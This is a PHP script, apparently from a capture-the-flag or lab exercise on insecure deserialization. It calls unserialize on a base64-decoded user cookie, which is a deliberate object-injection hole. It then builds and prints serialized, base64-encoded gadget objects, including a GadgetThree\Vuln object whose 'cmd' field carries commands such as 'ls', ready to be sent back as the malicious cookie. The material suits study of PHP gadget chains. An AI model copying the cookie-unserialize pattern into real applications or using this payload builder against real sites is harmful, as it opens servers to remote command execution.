<?php
require("vendor/autoload.php");

if (isset($_COOKIE['cookie'])) {
    $cookie = base64_decode($_COOKIE['cookie']);
    unserialize($cookie);
}

echo "Welcome to my web app!";
echo '<hr>';

/**************************************************************/
echo '<br><strong>gadget 1:</strong><br>';

$gadget_1 = new GadgetOne\Adders("\xde\xad\xbe\xef");
echo var_dump($gadget_1) . '<br>';
// echo bin2hex($gadget_1->get_x()) . '<br>';

$serialized_1 = serialize($gadget_1);
echo $serialized_1 . '<br>';
echo base64_encode($serialized_1) . '<br>';

/**************************************************************/
// echo '<br><strong>gadget 2:</strong><br>';

// $gadget_2 = new GadgetTwo\Echoers();
// echo var_dump($gadget_2) . '<br>';

// $serialized_2 = serialize($gadget_2);
// echo $serialized_2 . '<br>';
// echo base64_encode($serialized_2) . '<br>';

/**************************************************************/
echo '<br><strong>gadget 3:</strong><br>';

$gadget_3 = new GadgetThree\Vuln();
$gadget_3->waf1 = 1;
$gadget_3->cmd = 'ls';
echo var_dump($gadget_3) . '<br>';

$serialized_3 = serialize($gadget_3);
echo $serialized_3 . '<br>';
echo base64_encode($serialized_3) . '<br>';

/**************************************************************/
echo '<hr>';

//     # O:17:"GadgetTwo\Echoers":1:{s:8:"*klass";N;}
// $s = 'O:17:"GadgetTwo\Echoers":1:{s:5:"klass";i:42;}';
// $o = unserialize($s);
// echo var_dump($o) . '<br>';

// echo '<br>';

// $g = 'O:16:"GadgetThree\Vuln":4:{s:4:"waf1";i:1;s:4:"waf2";s:16:"\\xde\\xad\\xbe\\xef";s:4:"waf3";i:69;s:3:"cmd";s:2:"ls";}';
// $o = unserialize($g);
// echo var_dump($o) . '<br>';

/**************************************************************/
echo '<br>';

$o = new GadgetThree\Vuln();
$o->waf1 = 1;
$o->waf2 = new GadgetOne\Adders("\xde\xad\xbe\xef");
$o->waf3 = false;
$o->cmd = "\$waf3=1";
echo var_dump($o) . '<br>';

$s = serialize($o);
echo 'serialized: ' . $s . '<br>';

$o = unserialize($s);
echo 'unserialized: ' . strval($o) . '<br>';

$b64 = base64_encode($s);
echo 'base64: ' . $b64 . '<br>';
